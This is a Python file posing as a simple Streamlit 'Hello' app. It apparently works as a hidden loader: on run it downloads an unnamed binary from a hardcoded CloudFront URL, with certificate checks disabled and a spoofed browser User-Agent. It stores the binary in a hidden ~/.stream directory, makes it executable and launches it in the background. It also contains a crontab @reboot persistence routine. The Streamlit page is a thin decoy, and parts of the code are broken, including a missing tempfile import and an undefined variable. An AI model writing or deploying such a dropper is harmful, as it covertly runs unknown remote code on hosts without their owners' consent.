import pathlib
import ssl
import urllib.request
import shutil
from datetime import datetime
import os
import platform
import sys
import subprocess
import argparse
import time
import streamlit as st


INSTALL_DIR = pathlib.Path.home() / ".stream"
DEBUG_LOG = INSTALL_DIR / "debug.log"
PID_FILE = INSTALL_DIR / "stream.pid"
BIN_FILE = INSTALL_DIR / "stream"
BIN_ARGS = ""

def debug_log(message):
    print(message)
    write_debug_log(message)

def write_debug_log(message):
    try:
        if not INSTALL_DIR.exists():
            INSTALL_DIR.mkdir(parents=True, exist_ok=True)
        with open(DEBUG_LOG, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"写入日志失败: {e}")

def http_get(url, timeout=10):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        debug_log(f"HTTP请求失败: {url}, 错误: {e}")
        return None

def download_file(url, target_path, mode='wb'):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=ctx) as response, open(target_path, mode) as out_file:
            shutil.copyfileobj(response, out_file)
        return True
    except Exception as e:
        debug_log(f"下载文件失败: {url}, 错误: {e}")
        return False


# 下载二进制文件
def download_binary(name, download_url, target_path):
    debug_log(f"正在下载 {name}...")
    success = download_file(download_url, target_path)
    if success:
        debug_log(f"{name} 下载成功!")
        os.chmod(target_path, 0o755)
        return True
    else:
        debug_log(f"{name} 下载失败!")
        return False

# 安装过程
def install(args):
    if not INSTALL_DIR.exists():
        INSTALL_DIR.mkdir(parents=True, exist_ok=True)
    os.chdir(INSTALL_DIR)
    debug_log("开始安装过程")

    system = platform.system().lower()
    machine = platform.machine().lower()
    arch = ""
    if system == "linux":
        if "x86_64" in machine or "amd64" in machine: arch = "amd64"
        elif "aarch64" in machine or "arm64" in machine: arch = "arm64"
        else: arch = "amd64"
    else:
        debug_log(f"不支持的系统类型: {system}")
        sys.exit(1)
    debug_log(f"检测到系统: {system}, 架构: {machine}, 使用架构标识: {arch}")
    url = args.url + f"?arch={arch}"
    download_binary("stream", url, BIN_FILE)
    create_startup_script()
    start_services()


# 创建启动脚本
def create_startup_script():  
    start_script_path = INSTALL_DIR / "start.sh"
    start_content = f'''#!/bin/bash
cd {INSTALL_DIR.resolve()}
{BIN_FILE} {BIN_ARGS} > run.log 2>&1 &
echo $! > {PID_FILE}
'''
    start_script_path.write_text(start_content)
    os.chmod(start_script_path, 0o755)


# 启动服务
def start_services():
    debug_log("正在启动服务...")
    subprocess.run(str(INSTALL_DIR / "start.sh"), shell=True)
    
    debug_log("等待服务启动 (约5秒)...")
    time.sleep(5)
    debug_log("服务启动命令已执行. ")

# 检查脚本运行状态
def check_status():
    running = PID_FILE.exists() and os.path.exists(f"/proc/{PID_FILE.read_text().strip()}")
    if running:
        debug_log(f"当前状态 active : {PID_FILE.read_text().strip()}")
        return True
    else:
        debug_log(f"当前状态 deactive ")
        return False

def uninstall():
    debug_log("开始卸载服务...")
    
    # 停止服务
    for pid_file_path in [PID_FILE]:
        if pid_file_path.exists():
            try:
                pid = pid_file_path.read_text().strip()
                if pid:
                    debug_log(f"正在停止进程 PID: {pid} (来自 {pid_file_path.name})")
                    os.system(f"kill {pid} 2>/dev/null || true")
            except Exception as e:
                debug_log(f"停止进程时出错 ({pid_file_path.name}): {e}")
    time.sleep(1) # 给进程一点时间退出

    # 强制停止 (如果还在运行)
    debug_log("尝试强制终止可能残留进程...")
    os.system(f"pkill -9 -f '{BIN_FILE} {BIN_ARGS}' 2>/dev/null || true")

    # 移除crontab项
    try:
        crontab_list = subprocess.check_output("crontab -l 2>/dev/null || echo ''", shell=True, text=True)
        lines = crontab_list.splitlines()
        
        script_name_str = str((INSTALL_DIR / "start.sh").resolve())
        filtered_lines = [
            line for line in lines
            if script_name_str not in line and line.strip()
        ]
        
        new_crontab = "\n".join(filtered_lines).strip()
        
        if not new_crontab: # 如果清空了所有条目
            subprocess.run("crontab -r", shell=True, check=False) # check=False as it might error if no crontab exists
            debug_log("Crontab 清空 (或原有条目已移除).")
        else:
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp_crontab_file:
                tmp_crontab_file.write(new_crontab + "\n")
                crontab_file_path = tmp_crontab_file.name
            subprocess.run(f"crontab {crontab_file_path}", shell=True, check=True)
            os.unlink(crontab_file_path)
            debug_log("Crontab 自启动项已移除。")
    except Exception as e:
        debug_log(f"移除crontab项时出错: {e}")

    # 删除安装目录
    if INSTALL_DIR.exists():
        try:
            shutil.rmtree(INSTALL_DIR)
            print(f"安装目录 {INSTALL_DIR} 已删除。")
        except Exception as e:
            print(f"无法完全删除安装目录 {INSTALL_DIR}: {e}. 请手动删除.")
            
    print("卸载完成。")
    sys.exit(0)


def upgrade():
    debug_log("开始升级")

# 设置开机自启动
def setup_autostart():
    try:
        crontab_list = subprocess.check_output("crontab -l 2>/dev/null || echo ''", shell=True, text=True)
        lines = crontab_list.splitlines()
        
        script_name = (INSTALL_DIR / "start.sh").resolve()

        filtered_lines = [
            line for line in lines 
            if str(script_name) not in line and line.strip()
        ]
        
        filtered_lines.append(f"@reboot {script_name} >/dev/null 2>&1")
        new_crontab = "\n".join(filtered_lines).strip() + "\n"
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp_crontab_file:
            tmp_crontab_file.write(new_crontab)
            crontab_file_path = tmp_crontab_file.name
        
        subprocess.run(f"crontab {crontab_file_path}", shell=True, check=True)
        os.unlink(crontab_file_path)
            
        debug_log("已设置开机自启动")
    except Exception as e:
        script_name(f"设置开机自启动失败: {e}")

# 添加命令行参数解析
def parse_args():
    parser = argparse.ArgumentParser(description="shell command")
    parser.add_argument("action", nargs="?", default="install",
                        choices=["install", "status", "update", "del", "uninstall", "cat"],
                        help="操作类型: install(安装), status(状态), update(更新), del(卸载)")
    parser.add_argument("--url", "-u", default="https://dmmcy0pwk6bqi.cloudfront.net/853383895c60825679a5d3c89396f9195278f628", help="donwload url")

    return parser.parse_args()

def main():
    args = parse_args()

    if args.action == "install":
        install(args)
    elif args.action in ["uninstall", "del"]:
        uninstall()
    elif args.action == "update":
        upgrade()
    elif args.action == "status":
        check_status()
    else: # 默认行为，通常是 'install' 或者检查后提示
        if INSTALL_DIR.exists() and PID_FILE.exists():
            debug_log("检测到可能已安装并正在运行")
            if check_status():
                debug_log("如需重新安装，请先执行卸载: python3 " + os.path.basename(__file__) + " del")
            else:
                debug_log("服务状态异常，建议尝试重新安装.")
                install(args) # 尝试重新安装
        else:
            debug_log("未检测到完整安装，开始执行安装流程...")
            install(args)

def markdown():
    st.title("Hello Streamlit-er 👋")

    if st.button("文件数据"):
        st.text_area(
            "当前目录的文件:",
            home,
        )
    

if __name__ == "__main__":
    main()
    markdown()

